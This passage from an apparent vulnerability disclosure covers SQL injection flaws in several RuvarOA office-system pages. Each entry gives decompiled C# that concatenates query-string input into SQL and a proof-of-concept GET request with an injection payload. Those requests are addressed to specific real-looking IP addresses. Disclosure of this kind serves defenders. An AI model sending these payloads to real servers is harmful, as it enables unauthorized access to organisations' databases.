        DataView dataView = SqlHelper.QueryView(sQLString);
        if (dataView.Count &gt; 0)
        {
            byte[] array = (byte[])dataView[0]["filedata"];
            ((Page)this).Response.Clear();
            ((Page)this).Response.BinaryWrite(array);
        }
        else
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["filename"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_work_stat_setting.aspx</h3><a id="user-content-wf_work_stat_settingaspx" class="anchor" aria-label="Permalink: wf_work_stat_setting.aspx" href="#wf_work_stat_settingaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-21" class="anchor" aria-label="Permalink: path" href="#path-21"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkFlow/wf_work_stat_setting.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-21" class="anchor" aria-label="Permalink: POC" href="#poc-21"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkFlow/wf_work_stat_setting.aspx?template_id=@@version HTTP/1.1
Host: 8.129.124.44:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-21" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-21"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_work_stat_setting within the DLL file /RuvarOA/bin/WorkFlow.dll</p>
<pre><code>public class wf_work_stat_setting : Page
{
    protected HtmlHead Head1;

    protected HtmlForm form1;

    protected HtmlInputRadioButton statGroup_0;

    protected HtmlInputRadioButton statGroup_1;

    protected HtmlInputRadioButton statWay_0;

    protected HtmlInputRadioButton statWay_1;

    protected HtmlTable tblFields;

    protected ListBox lbStatFieldS;

    protected ListBox lbStatFieldT;

    protected TextBox txt_template_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            txt_template_id.Text = ((Page)this).Request.QueryString["template_id"];
            if (Validate.isNullOrSpace(txt_template_id.Text))
            {
                txt_template_id.Text = "0";
            }
            string text = ((Page)this).Request.QueryString["statWay"];
            string defaultField = ((Page)this).Request.QueryString["statField"];
            string text2 = ((Page)this).Request.QueryString["statGroup"];
            if (text2 == "Dept")
            {
                statGroup_1.Checked = false;
                statGroup_0.Checked = true;
            }
            else
            {
                statGroup_0.Checked = false;
                statGroup_1.Checked = true;
            }
            if (text == "Sum")
            {
                statWay_0.Checked = false;
                statWay_1.Checked = true;
                ((HtmlControl)tblFields).Attributes["style"] = "display:";
            }
            else
            {
                statWay_1.Checked = false;
                statWay_0.Checked = true;
                ((HtmlControl)tblFields).Attributes["style"] = "display:none";
            }
            InitField(defaultField);
        }
    }

    private void InitField(string defaultField)
    {
        //IL_013f: Unknown result type (might be due to invalid IL or missing references)
        //IL_0149: Expected O, but got Unknown
        //IL_00f9: Unknown result type (might be due to invalid IL or missing references)
        //IL_0103: Expected O, but got Unknown
        ((ListControl)lbStatFieldS).Items.Clear();
        ((ListControl)lbStatFieldT).Items.Clear();
        string sQLString = "SELECT f_field_name,f_field_caption,f_field_type_value from office_missive_template_field where  f_template_id=" + txt_template_id.Text + " order by f_field_order asc,office_field_id asc  ";
        DataView dataView = SqlHelper.QueryView(sQLString);
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_office_file_history_show.aspx</h3><a id="user-content-wf_office_file_history_showaspx" class="anchor" aria-label="Permalink: wf_office_file_history_show.aspx" href="#wf_office_file_history_showaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-22" class="anchor" aria-label="Permalink: path" href="#path-22"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WorkFlow/wf_office_file_history_show.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-22" class="anchor" aria-label="Permalink: POC" href="#poc-22"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WorkFlow/wf_office_file_history_show.aspx?id=1%27%20and%20%28@@version%29%3E0-- HTTP/1.1
Host: 58.63.71.222:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302587312-1c8e4baa-0713-4bfa-98e3-598dc777dda0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODczMTItMWM4ZTRiYWEtMDcxMy00YmZhLTk4ZTMtNTk4ZGM3NzdkZGEwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEyYWVjZDE0NGM5NjZlZmI3NWNhZjE4MmI3OTljNGVjMjhmNzZjYjllNmEyMjk5OWU5YmJlYjAyNDY2MmYwNDcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mxVliZWF58FEWwzJm-2h3qHu_QjF5J6D1w2YV07AGQk"><img width="1579" alt="image-20240128002609904" src="https://private-user-images.githubusercontent.com/18260135/302587312-1c8e4baa-0713-4bfa-98e3-598dc777dda0.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1ODczMTItMWM4ZTRiYWEtMDcxMy00YmZhLTk4ZTMtNTk4ZGM3NzdkZGEwLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEyYWVjZDE0NGM5NjZlZmI3NWNhZjE4MmI3OTljNGVjMjhmNzZjYjllNmEyMjk5OWU5YmJlYjAyNDY2MmYwNDcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.mxVliZWF58FEWwzJm-2h3qHu_QjF5J6D1w2YV07AGQk" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-22" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-22"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_office_file_history_show within the DLL file /RuvarOA/bin/WorkFlow.dll</p>
<pre><code>public class wf_office_file_history_show : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string text = ((Page)this).Request.QueryString["id"];
        string strSQL = "select * from wf_office_file_history  where id='" + text + "'";
        SqlDataReader val = SqlHelper.ExecuteReader(strSQL);
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">SearchCondiction.aspx</h3><a id="user-content-searchcondictionaspx" class="anchor" aria-label="Permalink: SearchCondiction.aspx" href="#searchcondictionaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-23" class="anchor" aria-label="Permalink: path" href="#path-23"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WebUtility/SearchCondiction.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-23" class="anchor" aria-label="Permalink: POC" href="#poc-23"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WebUtility/SearchCondiction.aspx?PageID=1%27&amp;type=1 HTTP/1.1
Host: 58.63.71.222:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-23" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-23"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function SearchCondiction within the DLL file /RuvarOA/bin/WebUtility.dll</p>
<pre><code>public class SearchCondiction : Page
{
    protected HtmlHead Head1;

    protected HtmlForm form1;

    protected HtmlTable tblSearch;

    protected Button btnConfirm;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            string pageID = ((Page)this).Request.QueryString["PageID"];
            string text = ((Page)this).Request.QueryString["type"];
            if (text == "2")
            {
                OutPutTwo(pageID);
            }
            else
            {
                OutPutOne(pageID);
            }
        }
    }

    private void OutPutOne(string PageID)
    {
        //IL_0035: Unknown result type (might be due to invalid IL or missing references)
        //IL_003b: Expected O, but got Unknown
        //IL_003b: Unknown result type (might be due to invalid IL or missing references)
        //IL_0041: Expected O, but got Unknown
        //IL_00bd: Unknown result type (might be due to invalid IL or missing references)
        //IL_00c3: Expected O, but got Unknown
        DataView dataView = SqlHelper.QueryView("select * from sys_pagelist_search  where page_id=" + PageID + " order by field_order ");
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["pageID"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">get_find_condiction.aspx</h3><a id="user-content-get_find_condictionaspx" class="anchor" aria-label="Permalink: get_find_condiction.aspx" href="#get_find_condictionaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-24" class="anchor" aria-label="Permalink: path" href="#path-24"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">WebUtility/get_find_condiction.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-24" class="anchor" aria-label="Permalink: POC" href="#poc-24"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /WebUtility/get_find_condiction.aspx?PageID=1%27&amp;type=1 HTTP/1.1
Host: 58.63.71.222:88
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-24" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-24"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function get_find_condiction within the DLL file /RuvarOA/bin/WebUtility.dll</p>
<pre><code>namespace WebUtility;

public class get_find_condiction : Page
{
    protected HtmlHead Head1;

    protected HtmlForm form1;

    protected HtmlTable tblSearch;

    protected Button btnConfirm;

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!((Page)this).IsPostBack)
        {
            string pageID = ((Page)this).Request.QueryString["PageID"];
            string text = ((Page)this).Request.QueryString["type"];
            if (text == "2")
            {
                OutPutTwo(pageID);
            }
            else
            {
                OutPutOne(pageID);
            }
        }
    }
......
  private void OutPutOne(string PageID)
    {
        //IL_0035: Unknown result type (might be due to invalid IL or missing references)
        //IL_003b: Expected O, but got Unknown
        //IL_003b: Unknown result type (might be due to invalid IL or missing references)
        //IL_0041: Expected O, but got Unknown
        //IL_00bd: Unknown result type (might be due to invalid IL or missing references)
        //IL_00c3: Expected O, but got Unknown
        DataView dataView = SqlHelper.QueryView("select * from view_sys_pagelist_field  where page_id=" + PageID + " and u_id=0 and field_search=1 order by field_order ");
        if (dataView.Count &gt; 0)
......
    private void OutPutTwo(string PageID)
    {
        //IL_0038: Unknown result type (might be due to invalid IL or missing references)
        //IL_003e: Expected O, but got Unknown
        //IL_006c: Unknown result type (might be due to invalid IL or missing references)
        //IL_0072: Expected O, but got Unknown
        //IL_00d7: Unknown result type (might be due to invalid IL or missing references)
        //IL_00dd: Expected O, but got Unknown
        //IL_0305: Unknown result type (might be due to invalid IL or missing references)
        //IL_030b: Expected O, but got Unknown
        //IL_0370: Unknown result type (might be due to invalid IL or missing references)
        //IL_0376: Expected O, but got Unknown
        //IL_017f: Unknown result type (might be due to invalid IL or missing references)
        //IL_0185: Expected O, but got Unknown
        //IL_01e2: Unknown result type (might be due to invalid IL or missing references)
        //IL_01e8: Expected O, but got Unknown
        //IL_0276: Unknown result type (might be due to invalid IL or missing references)
        //IL_027c: Expected O, but got Unknown
        //IL_02ab: Unknown result type (might be due to invalid IL or missing references)
        //IL_02b1: Expected O, but got Unknown
        //IL_04e5: Unknown result type (might be due to invalid IL or missing references)
        //IL_04eb: Expected O, but got Unknown
        DataView dataView = SqlHelper.QueryView("select * from view_sys_pagelist_field  where page_id=" + PageID + " and u_id=0 and field_search=1 order by field_order ");
        int num = 0;
        if (dataView.Count &gt; 0)
</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["PageID"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
